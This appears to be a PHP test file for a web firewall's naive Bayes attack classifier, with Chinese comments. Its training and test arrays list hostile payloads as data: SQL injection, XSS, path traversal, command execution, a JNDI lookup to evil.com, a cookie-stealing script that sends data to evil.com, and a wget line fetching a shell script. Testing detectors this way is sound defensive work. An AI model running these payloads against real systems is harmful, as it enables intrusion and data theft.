<?php
/**
 * 朴素贝叶斯机器学习测试
 * 测试内容：
 *  - 分词效果
 *  - 训练与预测
 *  - 攻击/正常分类准确率
 *  - 与 Scorer 的集成
 *  - 冷启动保护（训练不足时不参与评分）
 */
define('ABSPATH', __DIR__ . '/..');
define('WAF_LOG_PATH', __DIR__ . '/../logs');
require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../src/Support/Functions.php';
require_once __DIR__ . '/../src/Learn/NaiveBayesClassifier.php';
require_once __DIR__ . '/../src/Learn/AutoLearn.php';
require_once __DIR__ . '/../src/Semantic/SemanticEngine.php';
require_once __DIR__ . '/../src/Semantic/FalsePositiveGuard.php';
require_once __DIR__ . '/../src/Semantic/SemanticMemoryPool.php';
require_once __DIR__ . '/../src/Core/Scorer.php';

$pass = 0;
$fail = 0;
$total = 0;

function test($name, $cond) {
    global $pass, $fail, $total;
    $total++;
    if ($cond) {
        $pass++;
        echo "✅ $name\n";
    } else {
        $fail++;
        echo "❌ $name\n";
    }
}

echo "========================================\n";
echo "🧠 朴素贝叶斯机器学习测试\n";
echo "========================================\n\n";

// 先清理模型，从零开始
NaiveBayesClassifier::reset();

// ============== 1. 分词测试 ==============
echo "--- 1. 分词测试 ---\n";

$tokens = NaiveBayesClassifier::tokenize("");
test("空字符串返回空数组", empty($tokens));

$tokens = NaiveBayesClassifier::tokenize("abc");
test("短字符串分词正常", count($tokens) >= 1);

$tokens = NaiveBayesClassifier::tokenize("SELECT * FROM users WHERE id=1");
test("SQL注入分词正常", count($tokens) > 5);

$tokens = NaiveBayesClassifier::tokenize("<script>alert(1)</script>");
$hasXssToken = in_array('__xss_pattern__', $tokens);
test("XSS特殊特征token提取", $hasXssToken);

$tokens = NaiveBayesClassifier::tokenize("../../etc/passwd");
$hasPathTrav = in_array('__path_trav__', $tokens);
test("路径穿越特殊特征token提取", $hasPathTrav);

$tokens = NaiveBayesClassifier::tokenize("system('ls -la')");
$hasCmd = in_array('__cmd_exec__', $tokens);
test("命令执行特殊特征token提取", $hasCmd);

$tokens = NaiveBayesClassifier::tokenize("{{7*7}}");
$hasSsti = in_array('__ssti_pattern__', $tokens);
test("SSTI特殊特征token提取", $hasSsti);

$tokens = NaiveBayesClassifier::tokenize("http://192.168.1.1/admin");
$hasInternalIp = in_array('__internal_ip__', $tokens);
test("内网IP特殊特征token提取", $hasInternalIp);

// ============== 2. 冷启动保护 ==============
echo "\n--- 2. 冷启动保护 ---\n";

$result = NaiveBayesClassifier::predict("test");
test("训练不足时返回unknown", $result['class'] === 'unknown');
test("训练不足时confidence为0", $result['confidence'] === 0);
test("训练不足时attack_prob为0.5", $result['attack_prob'] === 0.5);

$score = NaiveBayesClassifier::getAttackScore("SELECT * FROM users");
test("训练不足时getAttackScore返回0", $score === 0.0);

$info = NaiveBayesClassifier::getModelInfo();
test("模型信息初始攻击数为0", $info['attack_count'] === 0);
test("模型信息初始正常数为0", $info['normal_count'] === 0);

// ============== 3. 训练与预测 ==============
echo "\n--- 3. 训练与预测（基础）---\n";

$attackPayloads = [
    "' OR 1=1--",
    "1' AND SLEEP(5)--",
    "UNION SELECT username,password FROM users--",
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32",
    "system('cat /etc/passwd')",
    "exec('whoami')",
    "shell_exec('ls -la /')",
    '{{7*7}}',
    '${jndi:ldap://evil.com/exploit}',
    "base64_decode('c3lzdGVt')",
    "php://input",
    "file:///etc/passwd",
    "SELECT * FROM admin WHERE '1'='1'",
    "DROP TABLE users--",
    "INSERT INTO users VALUES ('hacker','123456')",
    "DELETE FROM accounts WHERE 1=1",
];

$normalPayloads = [
    "page=1&sort=name",
    "id=123&category=books",
    "search=hello world",
    "username=john_doe",
    "email=test@example.com",
    "product_id=456&quantity=2",
    "lang=en&theme=light",
    "from=home&to=about",
    "keyword=php tutorial",
    "tag=programming&page=2",
    "order_by=date&order=desc",
    "filter=active&type=user",
    "section=news&year=2024",
    "redirect=/dashboard",
    "callback=myFunction&_=123456",
    "utm_source=google&utm_medium=cpc",
    "ref=homepage&src=nav",
    "q=how to learn php",
    "title=hello world&body=this is a test",
    "name=Test User&message=Hello there",
];

foreach ($attackPayloads as $i => $p) {
    NaiveBayesClassifier::train($p, 'attack');
}
foreach ($normalPayloads as $p) {
    NaiveBayesClassifier::train($p, 'normal');
}
NaiveBayesClassifier::save();

$info = NaiveBayesClassifier::getModelInfo();
test("训练后攻击样本数正确", $info['attack_count'] === count($attackPayloads));
test("训练后正常样本数正确", $info['normal_count'] === count($normalPayloads));
test("词汇表不为空", $info['vocab_size'] > 0);

// ============== 4. 攻击分类准确率 ==============
echo "\n--- 4. 攻击分类准确率 ---\n";

$attackCorrect = 0;
$attackTotal = 0;
$attackTests = [
    "' OR '1'='1'--",
    "-1 UNION SELECT 1,2,3,version()--",
    "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    "cat /etc/passwd",
    "wget http://evil.com/shell.sh -O /tmp/shell.sh",
    '{{config|debug}}',
    "../../../../../../windows/system32/cmd.exe",
    "php://filter/read=convert.base64-encode/resource=config.php",
    "base64_decode(gzuncompress(str_rot13('...')))",
    "1; DROP TABLE users; --",
    "OR 1=1#",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
];

foreach ($attackTests as $t) {
    $result = NaiveBayesClassifier::predict($t);
    $attackTotal++;
    if ($result['class'] === 'attack') {
        $attackCorrect++;
    }
    echo "  🔍 $t -> {$result['class']} (prob: {$result['attack_prob']}, conf: {$result['confidence']})\n";
}

$attackAccuracy = $attackTotal > 0 ? round($attackCorrect / $attackTotal * 100, 1) : 0;
test("攻击检测准确率 >= 70% (实际: {$attackAccuracy}%)", $attackAccuracy >= 70);

// ============== 5. 正常分类准确率 ==============
echo "\n--- 5. 正常分类准确率（误报测试）---\n";

$normalCorrect = 0;
$normalTotal = 0;
$normalTests = [
    "page=3&per_page=20",
    "search=iphone 15 pro max",
    "user=alice&age=25&city=beijing",
    "article_id=999&comment_id=12345",
    "color=red&size=large&price_min=100&price_max=500",
    "token=abc123xyz789&timestamp=1690000000",
    "code=200&message=success&data=hello",
    "name=张三&phone=13800138000&email=zhangsan@example.com",
    "title=我的第一篇博客&content=这是正文内容&category=生活",
    "lat=39.9042&lng=116.4074&zoom=12",
];

foreach ($normalTests as $t) {
    $result = NaiveBayesClassifier::predict($t);
    $normalTotal++;
    if ($result['class'] === 'normal') {
        $normalCorrect++;
    }
    echo "  🔍 $t -> {$result['class']} (prob: {$result['attack_prob']}, conf: {$result['confidence']})\n";
}

$normalAccuracy = $normalTotal > 0 ? round($normalCorrect / $normalTotal * 100, 1) : 0;
test("正常分类准确率 >= 70% (实际: {$normalAccuracy}%)", $normalAccuracy >= 70);

// ============== 6. getAttackScore 测试 ==============
echo "\n--- 6. getAttackScore 分数测试 ---\n";

$attackScore = NaiveBayesClassifier::getAttackScore("' UNION SELECT * FROM admin--");
test("明显攻击的分数较高 (>50)", $attackScore > 50);

$normalScore = NaiveBayesClassifier::getAttackScore("page=1&sort=name&order=asc");
test("明显正常的分数较低 (<30)", $normalScore < 30);

test("攻击分数 > 正常分数", $attackScore > $normalScore);

// ============== 7. Scorer 集成测试 ==============
echo "\n--- 7. Scorer 集成测试 ---\n";

$scoreResult = WafScorer::score("' OR 1=1--", '/test.php', ['id' => "' OR 1=1--"], [], '1.2.3.4');
test("Scorer返回结果包含ml_bayes组件", isset($scoreResult['components']['ml_bayes']));
test("Scorer返回结果中ml_bayes有score字段", isset($scoreResult['components']['ml_bayes']['score']));
test("Scorer返回结果中ml_bayes有weight字段", isset($scoreResult['components']['ml_bayes']['weight']));
test("Scorer中ml_bayes权重为0.08", $scoreResult['components']['ml_bayes']['weight'] === 0.08);

$bayesInScorer = $scoreResult['components']['ml_bayes']['score'];
test("攻击payload在Scorer中的贝叶斯分数>0", $bayesInScorer > 0);

// ============== 8. 重置测试 ==============
echo "\n--- 8. 重置模型 ---\n";

NaiveBayesClassifier::reset();
$info = NaiveBayesClassifier::getModelInfo();
test("重置后攻击数归零", $info['attack_count'] === 0);
test("重置后正常数归零", $info['normal_count'] === 0);
test("重置后词汇表为空", $info['vocab_size'] === 0);

// ============== 9. 增量学习测试 ==============
echo "\n--- 9. 增量学习测试 ---\n";

for ($i = 0; $i < 5; $i++) {
    NaiveBayesClassifier::train("attack_payload_$i", 'attack');
}
for ($i = 0; $i < 5; $i++) {
    NaiveBayesClassifier::train("normal_param_$i", 'normal');
}
NaiveBayesClassifier::save();

$info = NaiveBayesClassifier::getModelInfo();
test("增量训练后攻击数=5", $info['attack_count'] === 5);
test("增量训练后正常数=5", $info['normal_count'] === 5);

// ============== 汇总 ==============
echo "\n========================================\n";
echo "📊 测试结果: $pass/$total 通过, $fail 失败\n";
echo "========================================\n";

exit($fail > 0 ? 1 : 0);
